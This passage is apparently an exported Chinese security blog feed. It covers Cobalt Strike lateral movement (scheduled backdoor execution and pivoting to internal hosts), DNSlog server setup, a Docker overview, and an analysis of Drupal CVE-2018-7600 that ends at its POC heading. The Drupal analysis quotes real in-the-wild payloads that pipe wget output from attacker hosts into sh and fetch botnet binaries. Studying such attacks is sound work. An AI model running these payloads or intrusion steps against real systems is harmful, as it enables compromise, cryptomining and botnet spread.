<h4 id="②-找到目标系统上的时间"><a href="#②-找到目标系统上的时间" class="headerlink" title="② 找到目标系统上的时间"></a>② 找到目标系统上的时间</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell net time</span><br><span class="line">[*] Tasked beacon to run: net time</span><br><span class="line">[+] host called home, sent: 39 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">找不到时间服务器。</span><br><span class="line"></span><br><span class="line">请键入 NET HELPMSG 3912 以获得更多的帮助。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">beacon&gt; shell net start <span class="string">&quot;windows time&quot;</span></span><br><span class="line">[*] Tasked beacon to run: net start <span class="string">&quot;windows time&quot;</span></span><br><span class="line">[+] host called home, sent: 55 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">请求的服务已经启动。</span><br><span class="line"></span><br><span class="line">请键入 NET HELPMSG 2182 以获得更多的帮助。</span><br></pre></td></tr></table></figure>

<p>不懂开了但是还是不行。这里就当作开了，知道了时间为2022/02/18吧</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645120610102-e89c042c-8894-4de0-9ed0-38f517dd077f.png" alt="img"></p>
<h4 id="③-创建一个计划任务"><a href="#③-创建一个计划任务" class="headerlink" title="③ 创建一个计划任务"></a>③ 创建一个计划任务</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell at 2:02 c:\windows\temp\w01ke2.exe</span><br><span class="line">[*] Tasked beacon to run: at 2:02 c:\windows\temp\w01ke2.exe</span><br><span class="line">[+] host called home, sent: 65 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">新加了一项作业，其作业 ID = 1</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645120830841-d415c3f7-7681-4cd6-be63-a64c4ebdc435.png" alt="img"></p>
<h4 id="④-验证"><a href="#④-验证" class="headerlink" title="④ 验证"></a>④ 验证</h4><p>当到了规定时间后，目标机器上线</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645120955385-7429aa51-c10b-4a7b-8b1c-aac3c4f15d46.png" alt="img"></p>
<h1 id="十一、CS正向连接多层内网"><a href="#十一、CS正向连接多层内网" class="headerlink" title="十一、CS正向连接多层内网"></a>十一、CS正向连接多层内网</h1><p>这是源自网络上的一张概念图，大致原理如图所示</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645368104840-3e06b27f-48fa-4f4a-b320-da79afdbaab2.png" alt="img"></p>
<p>首先跳板机上已经有了 cs 的后门，通过后门查看网络信息发现存在 172.16.214.0/24 网段，跳板机拥有双网卡是可以访问内网主机的，所以在 CS 中可以通过跳板机访问内网主机</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645437011988-9cdce554-c101-4bb7-bb0a-a99dafef61b1.png" alt="img"></p>
<ol>
<li>生成监听器，选择Beacon TCP</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645437203546-9f161a1c-c0e5-49ef-81a1-3da0b82b43f5.png" alt="img"></p>
<ol start="2">
<li>生成后门 windows executable(s)</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645437322487-ad38ff4b-934c-45dc-957b-1ad26718d0f0.png" alt="img"></p>
<ol start="3">
<li><p>将后门复制到内网主机(172.16.214.141)上并执行</p>
</li>
<li><p>在 cs 中进入会话 beacon，使用命令连接内网主机</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">connect 172.14.214.141 4444</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220221182409526.png" alt="image-20220221182409526"></p>
<h1 id="十二、CS反向连接多层内网"><a href="#十二、CS反向连接多层内网" class="headerlink" title="十二、CS反向连接多层内网"></a>十二、CS反向连接多层内网</h1><p>使用正向连接很可能因为内网防火墙的存在遭到拦截而连接失败，此时可以使用反向连接突破防火墙的拦截</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645437612202-9c229507-afed-49c9-9eab-fe32f253ecd6.png" alt="img"></p>
<ol>
<li>在选择做代理的会话选择 listener，即跳板机的会话</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645437901621-764f9a18-ac0f-49d7-bb89-76c633e618ab.png" alt="img"></p>
<p>新建监听器</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645437952744-8d1739c0-5cc2-4787-ace0-61dfd1e4ef35.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645438031195-acfd47e6-798c-446e-a0b3-5ed12adb3f89.png" alt="img"></p>
<ol start="2">
<li>创建后门</li>
</ol>
<p>选择带有 s 的选项，在 listener 选择刚刚创建的监听器</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645438214149-693f41e2-afa3-49b7-99ba-b2a402a51298.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645438428246-6350730e-3cd2-4bfe-bf88-0173b7cf3b9f.png" alt="img"></p>
<ol start="3">
<li>在内网主机上执行后门</li>
</ol>
<p>执行后，后门会主动连接到跳板机，cs 即会上线</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645438528021-b9d060c9-07a9-45b1-836b-ea7890a3f031.png" alt="img"></p>
<h1 id="十三、参考链接"><a href="#十三、参考链接" class="headerlink" title="十三、参考链接"></a>十三、参考链接</h1><ul>
<li><p><a href="https://blog.csdn.net/weixin_44677409/article/details/102725129">https://blog.csdn.net/weixin_44677409/article/details/102725129</a></p>
</li>
<li><p><a href="https://www.freebuf.com/articles/web/255876.html">https://www.freebuf.com/articles/web/255876.html</a></p>
</li>
<li><p><a href="https://zhuanlan.zhihu.com/p/359251293">https://zhuanlan.zhihu.com/p/359251293</a></p>
</li>
<li><p><a href="https://www.mrwu.red/fenxiang/3673.html">https://www.mrwu.red/fenxiang/3673.html</a></p>
</li>
<li><p><a href="https://wiki.wgpsec.org/knowledge/intranet/Aggressor-script.html">https://wiki.wgpsec.org/knowledge/intranet/Aggressor-script.html</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>安全工具/安全开发</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>DNSlog平台的搭建</title>
    <url>/post/54d8f8e4.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、DNSlog简介"><a href="#一、DNSlog简介" class="headerlink" title="一、DNSlog简介"></a>一、DNSlog简介</h1><p>在某些情况下，无法利用漏洞获得回显。但是，如果目标可以发送DNS请求，则可以通过DNS log方式将想获得的数据外带出来（oob）。</p>
<p>DNS log常用于以下情况：</p>
<ul>
<li>SQL盲注</li>
<li>无回显的命令执行</li>
<li>无回显的SSRF</li>
</ul>
<h1 id="二、搭建DNS-log平台"><a href="#二、搭建DNS-log平台" class="headerlink" title="二、搭建DNS log平台"></a>二、搭建DNS log平台</h1><h2 id="1、前期准备"><a href="#1、前期准备" class="headerlink" title="1、前期准备"></a>1、前期准备</h2><p>一台VPS</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.x.x.x</span><br></pre></td></tr></table></figure>

<p>一个域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wolke.cn</span><br></pre></td></tr></table></figure>

<p>在wolke.cn中添加添加一个A记录与一个NS记录。其中A记录指向服务器IP地址，NS记录指向A记录的域名地址</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657562613907-c9d1e7a7-0335-4785-a270-e1759156cc0c.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657562881191-ad3d59d6-aae1-4866-b9fa-7108a2afa188.png" alt="img"></p>
<h2 id="2、项目部署"><a href="#2、项目部署" class="headerlink" title="2、项目部署"></a>2、项目部署</h2><p>参考开源项目DNSlog-GO：<a href="https://github.com/lanyi1998/DNSlog-GO">https://github.com/lanyi1998/DNSlog-GO</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657557026089-4305fe46-3c10-4169-8fe7-0dcf9cf3f6ee.png" alt="img"></p>
<ol>
<li>该项目是由GO语言编写的,所以部署的时候需要用到GO语言的环境</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657557546342-a6ff2d8a-eabb-42c2-8782-a0b41c694fa6.png" alt="img"></p>
<ol start="2">
<li>DNS使用的是53（UDP）端口，记得53端口的放行</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657557785213-0185e0dd-d69e-4901-83c9-d0e2a2b6898e.png" alt="img"></p>
<ol start="3">
<li>配置文件config.yaml的修改（我这里HTTP采用的是8000端口，也记得要放行）</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563048509-991cf600-f74a-4b75-b040-df7ca5262abe.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657562901833-45d9ccd8-a0c5-499b-a06e-38070446ce29.png" alt="img"></p>
<ol start="4">
<li>启动</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563107321-afeeb64a-aae8-43ef-b2a1-ff447ac72ec2.png" alt="img"></p>
<h2 id="3、测试"><a href="#3、测试" class="headerlink" title="3、测试"></a>3、测试</h2><p>访问<a href="http://ip:8000/">http://ip:8000</a></p>
<p>需要输入token，这里的token就是config.yaml设置的值</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563363392-7cfa047a-ad31-4022-bb1e-dbf85df8197f.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563433917-7ab15738-c93b-417a-8e2f-72b3c89740eb.png" alt="img"></p>
<p>点击复制随机子域名获取到 8xek8.dnslog.wolke.cn  </p>
<p>使用ping命令</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563128680-4d239280-469e-4454-8ac3-99477b39b830.png" alt="img"></p>
<p>可以看到回显结果</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657562914728-90fe294f-1d04-43e9-9d66-e54f6c044b5a.png" alt="img"></p>
<h1 id="三、后台运行并加入开机自启动"><a href="#三、后台运行并加入开机自启动" class="headerlink" title="三、后台运行并加入开机自启动"></a>三、后台运行并加入开机自启动</h1><p>上面的方法有两个不足</p>
<ul>
<li>无法后台运行</li>
<li>重启后进程不复存在</li>
</ul>
<p>经过一个多小时的排错和搜索资料，终于实现了开机自启动并后台运行。这里我详细地写下教程，免得大家像我一样出现很多错误耽误时间。</p>
<h2 id="1、编写Shell脚本"><a href="#1、编写Shell脚本" class="headerlink" title="1、编写Shell脚本"></a>1、编写Shell脚本</h2><p>在/root/DNSlog目录下编写run.sh，内容如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /root/DNSlog  # 这里根据自己DNSlog的main可执行文件所在位置进行修改即可</span><br><span class="line">./main &amp;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>之后执行run.sh这个脚本，此时进程虽然会输出到当前终端会话，但其实进程已经脱离了当前会话，可以安全的推出会话，进程也不会退出。</p>
</blockquote>
<h2 id="2、修改rc-local"><a href="#2、修改rc-local" class="headerlink" title="2、修改rc.local"></a>2、修改rc.local</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>

<p>在末尾加上这句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/root/DNSlog/run.sh &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220712033650679.png" alt="image-20220712033650679"></p>
<p>给rc.local加上可执行权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>

<h2 id="3、修改rc-local服务"><a href="#3、修改rc-local服务" class="headerlink" title="3、修改rc-local服务"></a>3、修改rc-local服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status rc-local.service <span class="comment"># 检查rc-local服务是否开启</span></span><br><span class="line">systemctl start rc-local.service  <span class="comment"># 开启rc-local服务</span></span><br><span class="line">systemctl <span class="built_in">enable</span> rc-local.service <span class="comment"># 将rc-local服务加入开机自启动</span></span><br></pre></td></tr></table></figure>

<h2 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h2><p>重启vps后，使用<code>ps -ef</code>可以发现已经自动运行了该程序，后台进程ID为1146</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657567000515-ee6504bc-cb0c-4422-b2df-9c2c33415a98.png" alt="img"></p>
<p>Web服务也能成功访问</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657567063255-69fdad6b-1358-4f22-92e4-b3473542ec07.png" alt="img"></p>
<blockquote>
<p> 杀死进程可以使用命令 <code>kill -9 进程PID</code></p>
</blockquote>
<h2 id="5、最后"><a href="#5、最后" class="headerlink" title="5、最后"></a>5、最后</h2><p>到这里我们就实现了只要VPS处于开机状态，main程序就自动运行，<strong>常开随用</strong>，我们可以方便快捷地使用DNSlog。但<strong>常开随用</strong>也带来了一个问题就是，如果某个攻击者获得了我们的Token（社工或爆破等手段），那么攻击者就可能会使用我们的VPS主机开启的DNSlog服务去进行一些非法渗透，而如果被溯源到就会很麻烦，因此我们需要提高Token的复杂度且避免泄露，或者不使用这节的技术，使用原始的<strong>随开随用</strong>方法，什么时候需要用DNSlog就什么时候运行main程序，很大程度上可以避免这个问题。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>DNSlog</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker概述</title>
    <url>/post/fb618b33.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Docker为什么会出现"><a href="#一、Docker为什么会出现" class="headerlink" title="一、Docker为什么会出现"></a>一、Docker为什么会出现</h1><p>&emsp;&emsp;一款产品：开发👉上线 经常需要两套环境！需要对其进行部署应用环境和应用配置。那么就有了开发人员和运维人员</p>
<p>&emsp;&emsp;<strong>问题：</strong>我在我的电脑上可以运行！但是在你的电脑就不能运行！或者版本更新，导致服务不可用！对于运维来说，考验就十分大，环境配置是十分的麻烦，每一个机器都要部署环境（集群Redis、ES、Hadoop）！费时费力。发布一个项目（jar+（Redis MySQL jdk ES）），项目能不能都带上环境安装打包？</p>
<p>&emsp;&emsp;Docker的思想就来自于集装箱</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630162355120-9f72646e-dd42-49d3-a37a-54035e93291a.png" alt="img"></p>
<p>&emsp;&emsp;<strong>隔离：</strong>Docker核心思想！打包装箱！每个箱子都是互相隔离的。利用隔离机制可以将服务器利用到极致！比如多个应用都是都是交叉的，可能会有端口冲突，如果使用了Docker就会隔离起来，不会造成端口冲突</p>
<p>&emsp;&emsp;<strong>本质：</strong>所有的技术都是因为出现了一些问题，我们需要去解决，才去学习！</p>
<h1 id="二、Docker的历史"><a href="#二、Docker的历史" class="headerlink" title="二、Docker的历史"></a>二、Docker的历史</h1><p>&emsp;&emsp;2010年，几个搞IT的年轻人，就在美国成立了一家公司 dotCloud ，做一些paas的云计算服务！LXC（虚拟机）有关的容器技术！他们将自己的技术（容器化技术）命名就是Docker！</p>
<p>&emsp;&emsp;Docker刚刚诞生的时候，没有引起行业的注意。dotCloud就活不下去，于是提出了开源（开放源代码），2013年，Docker开源。越来越多人发现了Docker的优点，于是Docker火了，Docker每个月都会更新一个版本</p>
<p>&emsp;&emsp;2014年4月9日，Docker1.0发布</p>
<p>&emsp;&emsp;Docker为什么这么火，因为它十分的轻巧。在容器技术出现之前，我们都是使用虚拟机技术，虚拟机也是虚拟化技术，Docker容器技术，也是一种虚拟化技术</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VM：Linux Centos原生镜像（一个电脑！）隔离，需要开启多个虚拟机  几个G  几分钟</span><br><span class="line">Docker：隔离，镜像（最核心的环境 4m + jdk + mysql）十分的小巧，运行镜像就可以了！小巧！几个M KB 秒级启动</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;到现在，所有开发人员都必须学会Docker！</p>
<p>&emsp;&emsp;Docker是基于Go语言开发的！开源项目！</p>
<p>&emsp;&emsp;官网：<a href="https://www.docker.com/">https://www.docker.com/</a></p>
<p>&emsp;&emsp;文档地址：<a href="https://docs.docker.com/">https://docs.docker.com/</a> Docker的文档是超级详细的！</p>
<p>&emsp;&emsp;仓库地址：<a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
<h1 id="三、Docker能做什么"><a href="#三、Docker能做什么" class="headerlink" title="三、Docker能做什么"></a>三、Docker能做什么</h1><h2 id="3-1-虚拟机技术"><a href="#3-1-虚拟机技术" class="headerlink" title="3.1 虚拟机技术"></a>3.1 虚拟机技术</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630188132430-01855eab-bb59-4b43-88b6-7b1923ba004d.png" alt="img"></p>
<p>&emsp;&emsp;虚拟机技术缺点：</p>
<ul>
<li>资源占用十分多</li>
</ul>
<ul>
<li><p>冗余步骤多</p>
</li>
<li><p>启动很慢</p>
</li>
</ul>
<h2 id="3-2-容器化技术"><a href="#3-2-容器化技术" class="headerlink" title="3.2 容器化技术"></a>3.2 容器化技术</h2><p>&emsp;&emsp;容器化技术不是模拟的一个完整的操作系统</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630188379153-26e3e720-3967-43bc-ab27-a6d59d6710fb.png" alt="img"></p>
<h2 id="3-3-不同点"><a href="#3-3-不同点" class="headerlink" title="3.3 不同点"></a>3.3 不同点</h2><ul>
<li>传统虚拟机，虚拟出一条硬件，运行一个完整的操作系统，然后在这个系统上安装和运行软件</li>
</ul>
<ul>
<li><p>容器内的应用直接运行在宿主机的内容，容器是没有自己的内核的，也没有虚拟我们的硬件，所以就轻便了。</p>
</li>
<li><p>每个容器是互相隔离的，每个容器内都有一个属于自己的文件系统，互不影响</p>
</li>
</ul>
<h1 id="四、DevOps（开发、运维）"><a href="#四、DevOps（开发、运维）" class="headerlink" title="四、DevOps（开发、运维）"></a>四、DevOps（开发、运维）</h1><ul>
<li><strong>应用更快速的交付和部署</strong><ul>
<li>传统：一堆帮助文档，安装程序</li>
<li>Docker：打包镜像发布测试，一键运行</li>
</ul>
</li>
<li><strong>更便捷的升级和扩缩容</strong><ul>
<li>使用了Docker后，我们部署应用就和搭积木一样！</li>
<li>项目打包为一个镜像，扩展 服务器A！服务器B</li>
</ul>
</li>
<li><strong>更简单的系统运维</strong><ul>
<li>在容器化之后，我们的开发和测试环境都是高度一致的</li>
</ul>
</li>
<li><strong>更高效的计算资源利用</strong><ul>
<li>Docker是内核级别的虚拟化，可以在一个物理机上可以运行很多的容器示例！服务器的性能可以被利用到极致</li>
<li>1核2G的服务器能运行很多服务！</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Drupal远程代码执行（CVE-2018-7600）</title>
    <url>/post/5279f9a1.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h1><p>Drupal是一个开源内容管理系统（CMS），全球超过100万个网站（包括政府，电子零售，企业组织，金融机构等）使用。Drupal安全团队披露了一个非常关键的漏洞，编号CVE-2018-7600 Drupal对表单请求内容未做严格过滤，因此，这使得攻击者可能将恶意注入表单内容，此漏洞允许未经身份验证的攻击者在默认或常见的Drupal安装上执行远程代码执行。</p>
<h1 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h1><p>该漏洞的产生的根本原因在于Drupal对表单的渲染上。</p>
<p>Drupal为了在表单渲染过程中能够动态修改数据，从6.x版本开始便引入了“Drupal Form API”的概念。<br>    相关文档如下：<a href="https://api.drupal.org/api/drupal/elements/8.6.x">https://api.drupal.org/api/drupal/elements/8.6.x</a></p>
<p>这些“可渲染的数组(Renderable arrays)”就是引发此次漏洞的”元凶”，它由一个key-value结构存储，其中key都以<code>#</code>(hash sign)开头，如下所示</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line"> ‘#type’ =&gt; ‘markup’,</span><br><span class="line"> ‘#markup’ =&gt; ‘&lt;em&gt;some text&lt;/em&gt;’,</span><br><span class="line"> ‘#prefix’ =&gt; ‘&lt;div&gt;’,</span><br><span class="line"> ‘#suffix’ =&gt; ‘&lt;/div&gt;’</span><br><span class="line"> ]</span><br></pre></td></tr></table></figure>

<p>Drupal在渲染这些“数组”时，将其中的数据未经安全过滤传入到<code>doRender</code>函数中。</p>
<p>以下是<code>doRender</code>函数调用<code>call_user_func_array</code>函数的代码片段：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649467568673-84d7c5bb-0407-4baa-98e6-a6e581427130.png" alt="img"></p>
<p>该方法取出”可渲染数组”<code>#lazy_builder</code>的值，未经过滤直接传入<code>call_user_func_array</code>函数，导致恶意代码被执行。</p>
<p>攻击链路还原如下：</p>
<ul>
<li>黑客在“可渲染数组”中插入构造恶意代码，如：<code>mail[#post_render][]=恶意代码</code></li>
<li>通过POST方法将含有恶意代码的“可渲染数组”提交到drupal系统中。</li>
<li>页面渲染流程中，“可渲染数组”中携带的恶意代码依次经过<code>buildform</code>-&gt;<code>uploadAjaxCallback</code>-&gt;<code>renderRoot</code>-&gt;<code>doRender</code>方法。</li>
<li>最终<code>doRender</code>方法将“可渲染数组”中的恶意代码取出，传入<code>call_user_func</code>函数，导致恶意代码被执行，成功触发漏洞，网站沦陷。</li>
</ul>
<p>相关代码：<a href="https://github.com/drupal/drupal/blob/8.6.x/core/lib/Drupal/Core/Render/Renderer.php">https://github.com/drupal/drupal/blob/8.6.x/core/lib/Drupal/Core/Render/Renderer.php</a></p>
<h1 id="三、影响版本"><a href="#三、影响版本" class="headerlink" title="三、影响版本"></a>三、影响版本</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Drupal 6.x</span><br><span class="line">Drupal 7.x</span><br><span class="line">Drupal 8.x</span><br></pre></td></tr></table></figure>

<h1 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h1><p>自从漏洞CVE-2018-7600公布开始，阿里云安全技术实验室就持续跟踪和监控该漏洞的利用情况，发现黑客从2018-04-12开始就已经进行了大批量的漏洞攻击。从最近这段时间监控到的数据发现，已有多个黑客组织开始使用该漏洞来从事黑产活动。</p>
<h2 id="1、挖矿牟利"><a href="#1、挖矿牟利" class="headerlink" title="1、挖矿牟利"></a>1、挖矿牟利</h2><pre><code> 我们捕获到黑客精心构造POST数据，利用Drupal漏洞进行攻击，实现挖矿盈利。具体样例如下：
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail[#markup]=wget -q http://67.231.243.10:8220/logo4.jpg -O - | sh&amp;mail[#type]=markup&amp;form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec</span><br></pre></td></tr></table></figure>

<p><code>logo4.jpg</code>实际是一个shell脚本，该shell脚本有两个功能：</p>
<ol>
<li>尝试结束市面上其他挖矿进程；其部分代码如下：</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649467929550-4c465c6a-22ed-4e5a-8436-d42fa84fdf6c.png" alt="img"></p>
<p>下载挖矿程序和挖矿程序配置脚本，并开始挖矿。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649467947283-bf1df74e-a75b-4466-b612-690d1b3d2d9c.png" alt="img"></p>
<p>拿到黑客的钱包地址后，我们在某个矿池中发现该黑客已经获得了75.87个门罗币，根据市场门罗币的行情预估，该黑客单在这一个矿池中就已经牟利11W，而且该地址的门罗币数量再以每天两个的数量在递增，其中利润之大可见一斑。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649467988754-a982a9a6-abe8-490d-9f6f-c58be2ccb0e7.png" alt="img"></p>
<h2 id="2、构建BillGates僵尸网络"><a href="#2、构建BillGates僵尸网络" class="headerlink" title="2、构建BillGates僵尸网络"></a>2、构建BillGates僵尸网络</h2><p>黑客执行 <code>wget -c -P /etc/ http://111.73.46.196:9876/sysxlv</code> 命令，下载<code>BillGates</code>木马，用于构建自己的僵尸网络。</p>
<p>该僵尸网络的相关信息：</p>
<ul>
<li>活跃时间：2018-02-14 ~ 至今</li>
<li>中控IP：111.73.46.196</li>
<li>相关域名：xvw.f3322.net</li>
<li>关联样本：e05747461650ae6688fe0ed2b1104f0e</li>
</ul>
<p>截至目前，影响云上用户趋势图如下：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649468051349-c68a7810-af20-4df6-8dc4-cbb0eb12b7ef.png" alt="img"></p>
<h2 id="3、收集信息并传播Mirai僵尸网络"><a href="#3、收集信息并传播Mirai僵尸网络" class="headerlink" title="3、收集信息并传播Mirai僵尸网络"></a>3、收集信息并传播Mirai僵尸网络</h2><p>黑客通过下发恶意shell代码，传播Mirai僵尸网络。</p>
<p>下图是shell通过wget将用户机器信息POST到<code>tc8zdw.if1j0ytgkypa.tk</code>：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649468082306-76bc035c-c76d-4688-8953-778e828bc710.png" alt="img"></p>
<p>数据各个字段的值均用base64加密过，解密后如下：</p>
<p><strong>上传信息字段名字段base64解码后的值</strong></p>
<table>
<thead>
<tr>
<th>version</th>
<th>EXD</th>
</tr>
</thead>
<tbody><tr>
<td>act</td>
<td>up，表示上传</td>
</tr>
<tr>
<td>uid</td>
<td>uid=0(root) gid=0(root) groups=0(root)</td>
</tr>
<tr>
<td>uname</td>
<td>Linux iZt4ncf567x3bguk2zv6haZ 2.6.32-696.16.1.el6.x86_64 #1 SMP Wed Nov 15 16:51:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</td>
</tr>
<tr>
<td>arch</td>
<td>64，表示64为操作系统</td>
</tr>
<tr>
<td>network</td>
<td><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649468171986-5f3a08bb-87e6-4628-834c-8d55d4896de5.png" alt="img"></td>
</tr>
<tr>
<td>process</td>
<td><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649468172234-3b278467-6306-4a00-b843-99f71db9a58b.png" alt="img"></td>
</tr>
</tbody></table>
<p>名为<code>64</code>的程序实际是一个Loader，负责判断环境，然后下载不同版本的Mirai僵尸网络。除此之外还会执行其他payload，如 <code>curl -fsSL http://tc8zdw.if1j0ytgkypa.tk/64 -o /tmp/57332442</code>。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649468221140-2b5aa2b4-91a8-4faa-a166-b3be8a1ab51d.png" alt="img"></p>
<p><strong>入侵趋势</strong></p>
<p>阿里云安全技术实验室从漏洞公布开始即密切关注云上该漏洞利用情况，发现云上批量攻击始于2018-04-12日，并快速增长，随着阿里云各个安全产品的联动拦截以及引导用户进行漏洞修复后，入侵趋势已基本下降下来。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649468248819-e4946d70-dcf6-4b4e-bae2-7884c307048f.png" alt="img"></p>
<p><strong>威胁评估</strong></p>
<p>本次补丁公布的时间点领先了批量漏洞利用时间点，用户拥有两周时间来进行安全更新。于此同时，云盾态势感知通用入侵检测模型在漏洞详情为公布前已经实现自动覆盖并向用户推送告警，目前绝大部分Drupal用户已经修复此漏洞，据最近一次入侵趋势观测结果(2018.04.18)显示，公有云存在漏洞的Drupal服务仅有2.6%。</p>
<p>与同类RCE漏洞相比，现阶段 Drupal(Drupalgeddon 2) 杀伤力未进入RCE漏洞第一梯队。</p>
<h1 id="五、POC"><a href="#五、POC" class="headerlink" title="五、POC"></a>五、POC</h1><p>访问Drupal靶场</p>
